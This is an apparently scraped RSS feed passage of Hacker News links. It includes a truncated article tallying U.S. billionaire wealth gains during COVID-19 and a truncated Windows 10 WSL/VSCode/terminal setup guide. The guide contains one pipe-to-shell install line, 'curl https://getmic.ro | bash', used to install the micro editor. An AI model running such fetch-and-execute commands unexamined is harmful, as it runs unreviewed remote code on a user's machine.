data-large-file="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?fit=768%2C444&amp;ssl=1" loading="lazy" width="768" height="444" src="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?resize=768%2C444&amp;is-pending-load=1#038;ssl=1" alt="" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?w=768&amp;ssl=1 768w, https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?resize=300%2C173&amp;ssl=1 300w" data-lazy-sizes="(max-width: 768px) 100vw, 768px" data-lazy-src="https://i0.wp.com/scheerpost.com/wp-content/uploads/2021/01/Billionaires-table-Jan.2021-768x444-1.png?resize=768%2C444&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Sources:&nbsp;All data in table is from Forbes and&nbsp;available here. March 18, 2020 data: Forbes, “Forbes Publishes 34th Annual List Of Global Billionaires,” March 18, 2020. Jan. 15, 2021 data: Forbes, “The World’s Real-Time Billionaires, Today’s Winners and Losers,” accessed Jan. 18, 2021</figcaption></figure>



<p>Ordinary Americans have not fared as well as billionaires during the pandemic:</p>



<ul><li>Over 25 million have fallen ill with the virus and more than 420,000 have died from it. [<a href="https://coronavirus.jhu.edu/region/united-states" target="_blank" rel="noreferrer noopener">Johns Hopkins Coronavirus Resource Center</a>]</li><li>Collective work income of rank-and-file private-sector employees—all hours worked times the hourly wages of the entire bottom 82% of the workforce—<a href="https://drive.google.com/file/d/1vRE31Wj1W9MRsVvjTH03Q_E5GgmjeHpm/view?usp=sharing" target="_blank" rel="noreferrer noopener">declined by 1%</a>&nbsp;in real terms from mid-March to mid-December, according to Bureau of Labor Statistics data.</li><li>Over 73 million lost work between Mar. 21 and Dec. 26, 2020. [<a href="https://oui.doleta.gov/unemploy/claims.asp" target="_blank" rel="noreferrer noopener">S. Department of Labor</a>]</li><li>16 million were collecting unemployment on Jan. 2, 2021. [<a href="https://www.dol.gov/ui/data.pdf" target="_blank" rel="noreferrer noopener">S. Department of Labor</a>]</li><li>Nearly 100,000 businesses have permanently closed. [<a href="https://www.cnbc.com/2020/09/16/yelp-data-shows-60percent-of-business-closures-due-to-the-coronavirus-pandemic-are-now-permanent.html" target="_blank" rel="noreferrer noopener">Yelp/CNBC</a>]</li><li>12 million workers have likely lost employer-sponsored health insurance during the pandemic as of August 26, 2020. [<a href="https://www.epi.org/press/12-million-people-have-likely-lost-employer-sponsored-health-insurance-since-february-policymakers-should-work-to-delink-jobs-and-access-to-insurance-coverage-by-expanding-public-options/" target="_blank" rel="noreferrer noopener">Economic Policy Institute</a>]</li><li>Some 29 million adults reported between Dec. 9-21 that their household had not had enough food in the past week. From Nov. 25-Dec. 7, between 8 and 12 million children lived in a household where kids did not eat enough because the household could not afford to fully feed them. [<a href="https://www.cbpp.org/research/poverty-and-inequality/tracking-the-covid-19-recessions-effects-on-food-housing-and" target="_blank" rel="noreferrer noopener">Center on Budget &amp; Policy Priorities (CBPP</a>)]</li><li>14 million adults—1 in 5 renters—reported in December being behind in their rent. [<a href="https://www.cbpp.org/research/poverty-and-inequality/tracking-the-covid-19-recessions-effects-on-food-housing-and" target="_blank" rel="noreferrer noopener">CBPP</a>]</li></ul>



<p>Because of long-standing racial and gender disparities,&nbsp;<a href="https://www.brookings.edu/blog/up-front/2020/11/16/new-but-narrow-job-pathways-for-americas-unemployed-and-low-wage-workers/" target="_blank" rel="noreferrer noopener">low-wage workers</a>,&nbsp;<a href="https://www.npr.org/sections/health-shots/2020/09/23/914427907/as-pandemic-deaths-add-up-racial-disparities-persist-and-in-some-cases-worsen" target="_blank" rel="noreferrer noopener">people of color</a>&nbsp;and&nbsp;<a href="https://www.weforum.org/agenda/2020/09/covid-19-gender-inequality-jobs-economy/" target="_blank" rel="noreferrer noopener">women</a>&nbsp;have suffered disproportionately in the combined medical and economic crises of 2020. Latinos are more likely to&nbsp;<a href="https://covid.cdc.gov/covid-data-tracker/#demographics" target="_blank" rel="noreferrer noopener">become infected with Covid-19</a>&nbsp;and Blacks to die from the disease than are white people. Billionaires are overwhelmingly white men.</p>



<p>The stock market surge and lock-down economy have been a boon to tech monopolies and helped create multiple U.S. “centi-billionaires.” Jeff Bezos, Elon Musk, and Bill Gates were each worth more than $100 billion on Jan. 18. Prior to this year, Bezos had been the only U.S. centi-billionaire, reaching that peak in 2018. Bezos and other billionaires have seen particularly astonishing increases in wealth over the past 10 months:</p>



<ul><li><strong>Elon Musk’s</strong>&nbsp;wealth grew by over $154 billion, from $24.6 billion on March 18 to $179.2 billion on Jan. 18, a nearly eight-fold increase, boosted by his&nbsp;<strong>Tesla</strong>&nbsp;The boost in wealth of the SpaceX founder over the past 10 months is more than twice that of any other billionaire. That $154 billion growth in wealth is also about seven times NASA’s&nbsp;<a href="https://www.planetary.org/space-policy/nasas-fy-2020-budget#:~:text=NASA%27s%20budget%20in%20fiscal%20year%20%28FY%29%202020%20is,by%20a%20supplemental%20budget%20request%20on%2013%20May." target="_blank" rel="noreferrer noopener">$22.6 billion budget in FY2020</a>, the federal agency Musk has&nbsp;<a href="https://www.usatoday.com/story/news/nation/2020/05/26/spacex-how-elon-musk-took-idea-cusp-history/5257977002/" target="_blank" rel="noreferrer noopener">credited with saving his company</a>&nbsp;with a big federal contract when the firm’s rockets were failing and it faced bankruptcy.</li><li><strong>Jeff Bezos’s&nbsp;</strong>wealth grew from $113 billion on March 18 to $182 billion, an increase of 61%. Adding in his ex-wife MacKenzie Scott’s wealth of $55 billion on Jan. 18, the two had a combined wealth of almost a quarter of a trillion dollars thanks to their&nbsp;<strong>Amazon</strong>&nbsp;If Bezos’s $68.6 billion growth in wealth was distributed to all his&nbsp;<a href="https://www.nytimes.com/2020/11/27/technology/pushed-by-pandemic-amazon-goes-on-a-hiring-spree-without-equal.html" target="_blank" rel="noreferrer noopener">810,000 U.S. employees</a>, each would get a windfall bonus of almost $85,000 and Bezos would not be any “poorer” than he was 10 months ago.</li><li><strong>Mark Zuckerberg’s&nbsp;</strong>wealth grew from $54.7 billion on March 18 to $92 billion, an increase of over two-thirds fueled by his&nbsp;<strong>Facebook</strong></li></ul>



<p>Tax reform that ensures the wealthy pay their fair share—the principle&nbsp;<a href="https://americansfortaxfairness.org/issue/joe-bidens-tax-plan/" target="_blank" rel="noreferrer noopener">the Biden tax plan</a>&nbsp;is built on—would transform a good chunk of those huge billionaire gains into public revenue to help heal a hurting nation. But getting at that big boost in billionaire fortunes is not as simple as raising tax rates: tax rules let the rich delay, diminish and even ultimately avoid any tax on the growth in their wealth. What’s needed is structural change to how wealth is taxed.</p>



<p>The most direct approach is an annual wealth tax on the biggest fortunes, proposed by Senators&nbsp;<a href="https://elizabethwarren.com/plans/ultra-millionaire-tax" target="_blank" rel="noreferrer noopener">Elizabeth Warren</a>&nbsp;and&nbsp;<a href="https://berniesanders.com/issues/tax-extreme-wealth/" target="_blank" rel="noreferrer noopener">Bernie Sanders</a>, among others. Another option is the annual taxation of investment gains on stocks and other tradable assets, an idea advanced by the&nbsp;<a href="https://www.finance.senate.gov/ranking-members-news/wyden-unveils-proposal-to-fix-broken-tax-code-equalize-treatment-of-wages-and-wealth-protect-social-security-" target="_blank" rel="noreferrer noopener">new Senate Finance Committee chair, Ron Wyden</a>. Even under the current discounted tax rates for investment income, if Wyden’s plan had been in effect in 2020, America’s billionaires would be paying hundreds of billions of dollars in extra taxes this spring thanks to their gargantuan pandemic profits last year.</p>



<hr>



<h4><strong>December 9, 2020 Update</strong></h4>



<p>According to a&nbsp;<a href="https://docs.google.com/spreadsheets/d/1qLbVmE3QyBh06GFFYkUv7eEWvz8DInZam4dx5vyLtT8/edit?usp=sharing" target="_blank" rel="noreferrer noopener">new report</a>&nbsp;by the Institute for Policy Studies (IPS) and Americans for Tax Fairness (ATF), the collective wealth of America’s 651 billionaires has jumped by over $1 trillion since roughly the beginning of the COVID-19 pandemic to a total of $4 trillion at market close on Monday, December 7, 2020. Combined, just the top 10 billionaires are now worth more than $1 trillion.</p>



<p>Their wealth growth since March is more than the&nbsp;<a href="https://www.washingtonpost.com/us-policy/2020/12/03/what-is-in-congressional-bailout-deal-stimulus-checks/" target="_blank" rel="noreferrer noopener">$908 billion in pandemic relief</a>&nbsp;proposed by a bipartisan group of members of Congress, which is likely to be the package that moves forward for a vote in the next week, but has been stalled over Republican concerns that it is too costly.</p>



<p>The total net worth of the nation’s 651 billionaires rose from $2.95 trillion on March 18—the rough start of the pandemic shutdowns—to $4.01 trillion on Dec. 7, a leap of 36%, based on an analysis of&nbsp;<em>Forbes</em>&nbsp;magazines research on billionaires. By around March 18 most&nbsp;<a href="https://www.cnn.com/2020/03/13/politics/states-coronavirus-fema/index.html" target="_blank" rel="noreferrer noopener">federal</a>&nbsp;and&nbsp;<a href="https://www.foxnews.com/us/what-states-have-declared-coronavirus-emergencies" target="_blank" rel="noreferrer noopener">state</a>&nbsp;economic restrictions in response to the virus were in place.</p>



<p>Forbes’ annual global billionaires report was published March 18, and ATF and IPS collected the real-time data on Dec. 7 from the&nbsp;<em>Forbes</em>&nbsp;website. The methodology of this analysis has been&nbsp;<a href="https://www.politifact.com/factchecks/2020/oct/12/joe-biden/biden-says-billionaires-gained-800-billion-study-l/" target="_blank" rel="noreferrer noopener">favorably reviewed by PolitiFact</a>. The ATF-IPS analysis also looks at wealth growth since February 2019—the date of Forbes’ immediately previous annual billionaires report published well before the start of the pandemic and resulting market gyrations.</p>



<p><strong>The $1 trillion wealth gain by 651 U.S. billionaires since mid-March is:</strong></p>



<ul><li>More than it would cost to send a stimulus check of $3,000 to every one of the roughly&nbsp;<a href="https://www.census.gov/popclock/embed.php?component=counter" target="_blank" rel="noreferrer noopener">330 million people in America</a>. A family of four would receive over $12,000. Republicans have blocked new stimulus checks from being included in the pandemic relief package.</li><li>Double the two-year estimated budget gap of all state and local governments, which is forecast to be at least&nbsp;<a href="https://www.wsj.com/articles/coronavirus-hit-state-budgets-create-a-drag-on-u-s-recovery-11597224600?mod=article_inline" target="_blank" rel="noreferrer noopener">$500 billion</a>. By June, state and local governments had already&nbsp;<a href="https://www.pewtrusts.org/en/research-and-analysis/articles/2020/06/16/how-covid-19-is-driving-big-job-losses-in-state-and-local-government" target="_blank" rel="noreferrer noopener">laid off 1.5 million workers</a>&nbsp;and public services—especially education—<a href="https://www.cnbc.com/2020/07/07/states-in-fiscal-crisis-cuts-to-basic-services-loom-due-to-pandemic.html" target="_blank" rel="noreferrer noopener">faced steep budget cuts</a>.</li><li>Only slightly less than total federal spending on Medicare (<a href="https://www.pgpf.org/budget-basics/medicare#footnote1" target="_blank" rel="noreferrer noopener">$644 billion in 2019</a>) and Medicaid (<a href="https://www.kff.org/medicaid/state-indicator/federalstate-share-of-spending/?dataView=1&amp;currentTimeframe=0&amp;selectedDistributions=federal&amp;sortModel=%7B%22colId%22:%22Location%22,%22sort%22:%22asc%22%7D" target="_blank" rel="noreferrer noopener">$389 billion in FY2019</a>), which together serve 120 million Americans (69 million in&nbsp;<a href="https://www.medicaid.gov/medicaid/program-information/medicaid-and-chip-enrollment-data/report-highlights/index.html" target="_blank" rel="noreferrer noopener">Medicaid</a>, 63 million in&nbsp;<a href="https://www.cms.gov/Research-Statistics-Data-and-Systems/Statistics-Trends-and-Reports/Dashboard/Medicare-Enrollment/Enrollment%20Dashboard.html" target="_blank" rel="noreferrer noopener">Medicare</a>, less 12 million&nbsp;<a href="https://www.medicareadvantage.com/resources/dual-eligible-medicare-medicaid-plans" target="_blank" rel="noreferrer noopener">enrolled in both</a>).</li><li>Nearly four times the&nbsp;<a href="https://www.bls.gov/opub/btn/volume-9/receipt-and-use-of-stimulus-payments-in-the-time-of-the-covid-19-pandemic.htm#_edn2" target="_blank" rel="noreferrer noopener">$267 billion total in stimulus payments</a>&nbsp;made to 159 million people earlier this year.</li></ul>



<p><strong>At $4 trillion the total wealth of all U.S. billionaires today is nearly double the&nbsp;</strong><a href="https://www.federalreserve.gov/releases/z1/dataviz/dfa/distribute/chart/" target="_blank" rel="noreferrer noopener"><strong>$2.1 trillion in total wealth</strong></a><strong>&nbsp;held by the bottom half of the population, or</strong>&nbsp;<a href="https://fred.stlouisfed.org/series/B230RC0Q173SBEA" target="_blank" rel="noreferrer noopener"><strong>165 million Americans</strong></a><strong>.</strong></p>



<p>“Never before has America seen such an accumulation of wealth in so few hands,” said&nbsp;<strong>Frank Clemente, executive director of Americans for Tax Fairness.</strong>&nbsp;“As tens of millions of Americans suffer from the health and economic ravages of this pandemic, a few hundred billionaires add to their&nbsp; massive fortunes. Their pandemic profits are so immense that America’s billionaires could pay for a major COVID relief bill and still not lose a dime of their pre-virus riches. Their …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/">https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/</a></em></p>]]>
            </description>
            <link>https://scheerpost.com/2021/01/27/billionaires-gone-wild-pandemic-profiteering-by-the-numbers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25965259</guid>
            <pubDate>Sat, 30 Jan 2021 01:59:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating my awesome Windows 10 dev setup]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 147 (<a href="https://news.ycombinator.com/item?id=25965231">thread link</a>) | @indigodaddy
<br/>
January 29, 2021 | https://chimerical.ca/posts/creating-my-awesome-windows-10-dev-setup/ | <a href="https://web.archive.org/web/*/https://chimerical.ca/posts/creating-my-awesome-windows-10-dev-setup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="background"><a href="#background">→</a>Background</h2><p>I recently got the chance to completely reset my Windows 10 machine, and took advantage of the
opportunity to create a dev environment I would love. These were my high-level goals:</p><ul><li>Make WSL my primary dev environment</li><li>Use VSCode as my primary editor</li><li>Have a beautiful terminal</li></ul><h2 id="wsl-%26-vscode"><a href="#wsl-%26-vscode">→</a>WSL &amp; VSCode</h2><p>To achieve this, I started by installing WSL 2. I went with an Ubuntu distro because that's what
I've had the most experience with in the past. You can find instructions on installing WSL and/or
upgrading it to WSL 2 in the <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">official
docs</a>.</p><p>Next I installed <a href="https://code.visualstudio.com/">VSCode</a>, and the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.vscode-remote-extensionpack">Remote Development extension
pack</a>
which is where things start to get fun. With this extension pack installed, you can edit files in
the WSL filesystem seamlessly with VSCode.</p><h2 id="windows-terminal"><a href="#windows-terminal">→</a>Windows Terminal</h2><p>To get my beautiful terminal going, I installed <a href="https://devblogs.microsoft.com/commandline/windows-terminal-1-0/">Windows
Terminal</a> (WT), which is an
awesome new terminal experience for Windows from Microsoft.</p><p>Although I wanted WSL to be my primary dev environment, I still wanted working in Windows to be a
nice experience as well, so I wanted to make sure my PowerShell terminal was great too. To get that
going, I also installed the latest <a href="https://devblogs.microsoft.com/powershell/announcing-powershell-7-0/">PowerShell
7</a>.</p><p>Now it was time to setup my WT profiles. By default, WT creates a profile for WSL, PowerShell, cmd,
and Azure Cloud Shell. I'm not interested in using cmd or Azure Cloud Shell, and I'm going to be
using PowerShell 7 instead of PowerShell, so I disabled all but the WSL shell. To do this, simply
add the <code>"hidden": true</code> property to the profiles in the WT settings file (click the dropdown in the
header bar and then Settings or <span><kbd>Ctrl</kbd>+<kbd>,</kbd></span>).</p><h3 id="powershell-wt-profile"><a href="#powershell-wt-profile">→</a>PowerShell WT Profile</h3><p>Now to create my PowerShell 7 profile, I added the following object to the profiles array:</p><pre data-language="json" data-index="0"><code><span><span>{</span></span>
<span><span>  </span><span>"guid"</span><span>: </span><span>"</span><span>{346d54ee-6282-41c7-846a-0a2fa38ff66b}</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"name"</span><span>: </span><span>"</span><span>PowerShell</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"commandline"</span><span>: </span><span>"</span><span>pwsh.exe</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"icon"</span><span>: </span><span>"</span><span>%SystemRoot%</span><span>\\</span><span>Installer</span><span>\\</span><span>{8B844F39-E6EE-486B-BE85-96A485AE2B96}</span><span>\\</span><span>PowerShellExe.ico</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"startingDirectory"</span><span>: </span><span>"</span><span>D:</span><span>\\</span><span>code</span><span>"</span></span>
<span><span>}</span></span></code></pre><p>A few things to note:</p><ul><li>To generate a GUID, you can use the <a href="https://www.guidgenerator.com/online-guid-generator.aspx">Online GUID
Generator</a> website</li><li>I am using the <code>pwsh.exe</code> command instead of <code>powershell.exe</code> to use PowerShell 7</li><li>Follow these steps to find the icon path on your system:<ol><li>Open your Start menu and search for PowerShell 7</li><li>Right click on the app and click "Open file location"</li><li>In the file explorer that opens, right click the shortcut and click "Properties"</li><li>On the "Shortcut" tab, click the "Change Icon..." button and copy the file path</li></ol></li><li>I like to set the starting directory to be where I keep all my projects, and ideally this is near
the root of a drive to keep file paths as short as possible</li></ul><h3 id="ubuntu-wt-profile"><a href="#ubuntu-wt-profile">→</a>Ubuntu WT Profile</h3><p>Since I want to make WSL my primary environment, I moved its profile object to the top of the list
so that it will appear first in the new tab dropdown. Then I replaced the top-level <code>defaultProfile</code>
property with the WSL profile's <code>guid</code> property to make it the profile that is opened automatically
when WT launches.</p><p>Similarly to PowerShell, I wanted the starting directory to be <code>~/code</code>. If you try setting that
directly in the WT configuration, you'll find it doesn't work because WT doesn't know how to resolve
it. You can use an absolute path to get there instead, and you need to use a Windows file path that
WT can understand. You can access a WSL distro's file system from Windows using <code>\\wsl$\&lt;distro&gt;</code>, so, I added this property to the Ubuntu profile object: <code>"startingDirectory": "\\\\wsl$\\Ubuntu\\home\\blake\\code"</code> (where <code>Ubuntu</code> should be replaced with the name of your WSL
distro and <code>blake</code> with your WSL username).</p><h3 id="wt-theme"><a href="#wt-theme">→</a>WT Theme</h3><p>Finally, I wanted to get a new theme for my WT. I decided I would like to use the same colour scheme
as I was using for VSCode at the time, which was the <a href="https://marketplace.visualstudio.com/items?itemName=sdras.night-owl">Night
Owl</a> theme. So (naturally), <a href="https://chimerical.ca/posts/generate-windows-terminal-scheme">I
created</a> a <a href="https://marketplace.visualstudio.com/items?itemName=blake-mealey.generate-wt-scheme">VSCode
plugin</a> to
automatically generate a WT theme.</p><p>Here's what my terminal looks like with the Night Owl theme:</p><p><span>
      <a href="https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/1628f/terminal.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Windows Terminal with Night Owl" title="Windows Terminal with Night Owl" src="https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/00d43/terminal.png" srcset="https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/63868/terminal.png 250w,https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/0b533/terminal.png 500w,https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/00d43/terminal.png 1000w,https://chimerical.ca/static/20a8faf4783f0c30ece0bcfc207c1fed/1628f/terminal.png 1232w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><h2 id="shell-profiles"><a href="#shell-profiles">→</a>Shell Profiles</h2><p>Next up I wanted to get my shell profiles started. We'll iterate on these more later on. Your shell
profile is a script that gets run when the terminal starts which can be used to configure the
current environment. For PowerShell, this will be a PowerShell script and for WSL it will be a bash
script.</p><h3 id="powershell-profile"><a href="#powershell-profile">→</a>PowerShell Profile</h3><p>Let's start with PowerShell again. You can run <code>echo $PROFILE</code> to see if a profile script already
exists. For me it did, and it was located at
<code>C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</code>. If it doesn't exist for you,
it's not a big deal. It seems that PowerShell looks in a <a href="https://devblogs.microsoft.com/scripting/understanding-the-six-powershell-profiles/">variety of
places</a> and you
can just create a script in the appropriate place and it should work. Here's what I added to my
profile script:</p><pre data-language="ps1" data-index="1"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name editor </span><span>-</span><span>Value nano</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name edit </span><span>-</span><span>Value editor</span></span>
<span></span>
<span><span>function</span><span> </span><span>profile_alias</span><span> { editor $PROFILE }</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name profile </span><span>-</span><span>Value profile_alias</span></span>
<span></span>
<span><span>function</span><span> </span><span>reload_alias</span><span> { </span><span>&amp;</span><span> $PROFILE }</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name reload </span><span>-</span><span>Value reload_alias</span></span></code></pre><p>Let's break this down a bit. First of all, I am creating a couple aliases (<code>editor</code> and <code>edit</code>) for
my in-terminal editor. I prefer to use a terminal editor instead of a GUI editor because it reduces
context switching when working in the terminal, and is much faster to load the file to make a quick
edit. That said, if you wanted to use VSCode, you could replace <code>nano</code> with <code>code</code>.</p><p>The reason I create an alias for my editor command is so that I can change the editor at any time
and not have to change my muscle memory to use the new command. It also means I can create more
aliases that open the editor without having to change all of them if I change my editor.</p><p>Next, I add the <code>profile</code> alias which opens the profile script in my editor (the <code>editor</code> alias is
already coming in handy!). This is great because now I don't need to remember where my profile is
ever again, I can just run <code>profile</code> and can start editing it right away. I also add a <code>reload</code>
alias which simply reloads the shell using the profile script. This lets me use my changes to the
profile script without having to create a new terminal instance.</p><h3 id="bash-profile"><a href="#bash-profile">→</a>Bash Profile</h3><p>Now let's do the same thing for bash. In bash, the profile is a bash script located at <code>~/.bashrc</code>.
By default it contains a lot of stuff already, so I like to add my changes to the bottom of the
script. Here's what I added:</p><pre data-language="bash" data-index="2"><code><span><span>#</span><span> ~/.bashrc</span></span>
<span></span>
<span><span>export</span><span> EDITOR=</span><span>"</span><span>nano</span><span>"</span></span>
<span><span>alias</span><span> editor=</span><span>"</span><span>$EDITOR</span><span>"</span></span>
<span><span>alias</span><span> edit=</span><span>"</span><span>editor</span><span>"</span></span>
<span></span>
<span><span>export</span><span> PROFILE=</span><span>"</span><span>~/.bashrc</span><span>"</span></span>
<span><span>alias</span><span> profile=</span><span>"</span><span>editor </span><span>$PROFILE</span><span>"</span></span>
<span><span>alias</span><span> reload=</span><span>"</span><span>source </span><span>$PROFILE</span><span>"</span></span>
<span></span>
<span><span>alias</span><span> explorer=</span><span>"</span><span>explorer.exe</span><span>"</span></span></code></pre><p>This is very similar to the PowerShell script. First, we create an <code>EDITOR</code> environment variable.
Some Linux programs respect the <code>EDITOR</code> variable, so it's a good idea to set it if you want more
programs to know which editor you want to use. Then we use <code>EDITOR</code> to create our <code>editor</code> and
<code>edit</code> aliases just like before.</p><p>Then, I add the same <code>profile</code> and <code>reload</code> aliases to edit and reload the profile script.</p><p>Finally, I added another alias which maps <code>explorer</code> to <code>explorer.exe</code> which makes it the same
command for opening the Windows File Explorer in WSL as in PowerShell.</p><h2 id="terminal-editor"><a href="#terminal-editor">→</a>Terminal Editor</h2><p>Let's revisit our terminal editor. I started with nano because it's a pretty intuitive and easy to
use editor for terminals. I don't have a lot of terminal editor experience, so I'm not very handy
with Vim, and even nano can be a bit awkward to use.</p><p>So, I did a bit of research to see if there were any editors that had more similar keyboard
shortcuts and navigation to a modern GUI text editor, like VSCode. I found
<a href="https://micro-editor.github.io/">micro</a> which is available cross-platform, which is perfect!</p><h3 id="powershell-editor"><a href="#powershell-editor">→</a>PowerShell Editor</h3><p>Let's install it. In PowerShell, it's most easily installed via <a href="https://scoop.sh/">scoop</a> or
<a href="https://chocolatey.org/">Chocolatey</a>. If you don't have either installed yet I'd highly recommend
you do, as it makes installing programs in Windows a much easier experience. I'm going to use scoop
for the purposes of this guide. With scoop installed, simply run <code>scoop install micro</code>. Now you can
run <code>micro</code> to edit your files.</p><p>Let's update our profile script to use it:</p><pre data-language="ps1" data-index="3"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name editor </span><span>-</span><span>Value micro</span></span></code></pre><h3 id="ubuntu-editor"><a href="#ubuntu-editor">→</a>Ubuntu Editor</h3><p>To install on Ubuntu, we can run the install script from the micro website:</p><pre data-language="bash" data-index="4"><code><span><span>curl https://getmic.ro </span><span>|</span><span> bash</span></span></code></pre><p>Now we can update our bash profile to use it:</p><pre data-language="bash" data-index="5"><code><span><span>#</span><span> ~/.bashrc</span></span>
<span></span>
<span><span>export</span><span> EDITOR=</span><span>"</span><span>micro</span><span>"</span></span></code></pre><h3 id="micro-theme"><a href="#micro-theme">→</a>Micro Theme</h3><p>One issue you might notice once you start editing in micro is that it's theme clashes with your WT
theme. One option could be to port your WT theme to micro, but this is quite a bit of work. I found
using the built-in <code>simple</code> theme uses your terminal theme's background colour and seems to fit
quite well for me.</p><p>To do this, you'll have to configure micro for PowerShell and WSL separately. To configure it, open
micro, press <span><kbd>Ctrl</kbd>+<kbd>E</kbd></span> to open the command prompt, then enter the command <code>set colorscheme simple</code>.</p><h2 id="terminal-prompt"><a href="#terminal-prompt">→</a>Terminal Prompt</h2><p>Finally, to make our terminal really pretty, we need to customize the prompt. There's lots of
options out there for this, but the most popular one seems to be
<a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh</a> for Bash and
<a href="https://github.com/JanDeDobbeleer/oh-my-posh">oh-my-posh</a> for PowerShell. I'm not a huge fan of
these because in my experience they slow down the terminal to a point which makes me frustrated to
use them, and since they are separate solutions for each environment they must be configured separately.</p><p>Enter <a href="https://starship.rs/">Starship</a>, a "blazing-fast," cross-platform alternative with a
delightfully simple prompt and some awesome customization (with the promise of even more coming in
future releases). Since WSL and PowerShell both have access to the Windows filesystem, we can even
store the Starship configuration in a central place and have both pull from it.</p><h3 id="powershell-starship"><a href="#powershell-starship">→</a>PowerShell Starship</h3><p>To install Starship for PowerShell, we can again use scoop: <code>scoop install starship</code>. To load
starship, we again need to edit our profile (now with our snazzy editor and single-command alias):</p><pre data-language="ps1" data-index="6"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Invoke-Expression</span><span> (</span><span>&amp;</span><span>starship init powershell)</span></span></code></pre><p>Now we can run our <code>reload</code> alias and see the beautiful prompt immediately.</p><h3 id="bash-starship"><a href="#bash-starship">→</a>Bash Starship</h3><p>Installing Starship for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chimerical.ca/posts/creating-my-awesome-windows-10-dev-setup/">https://chimerical.ca/posts/creating-my-awesome-windows-10-dev-setup/</a></em></p>]]>
            </description>
            <link>https://chimerical.ca/posts/creating-my-awesome-windows-10-dev-setup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25965231</guid>
            <pubDate>Sat, 30 Jan 2021 01:53:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Real-Time Attack-Scheme Visualization for Complex Exploit Technique Comprehensi [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25964937">thread link</a>) | @todsacerdoti
<br/>
January 29, 2021 | http://www.ijmlc.org/vol11/1030-FN008.pdf | <a href="https://web.archive.org/web/*/http://www.ijmlc.org/vol11/1030-FN008.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.ijmlc.org/vol11/1030-FN008.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25964937</guid>
            <pubDate>Sat, 30 Jan 2021 01:06:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Siliconpr0n: High Resolution Chip Maps]]>
            </title>
            <description>
<![CDATA[
Score 281 | Comments 76 (<a href="https://news.ycombinator.com/item?id=25964865">thread link</a>) | @lelf
<br/>
January 29, 2021 | https://siliconpr0n.org/map/ | <a href="https://web.archive.org/web/*/https://siliconpr0n.org/map/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://siliconpr0n.org/map/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25964865</guid>
            <pubDate>Sat, 30 Jan 2021 00:55:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reflecting on My Failure to Build a Billion-Dollar Company (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25964748">thread link</a>) | @wakahiu
<br/>
January 29, 2021 | https://sahillavingia.com/reflecting | <a href="https://web.archive.org/web/*/https://sahillavingia.com/reflecting">archive.org</a>
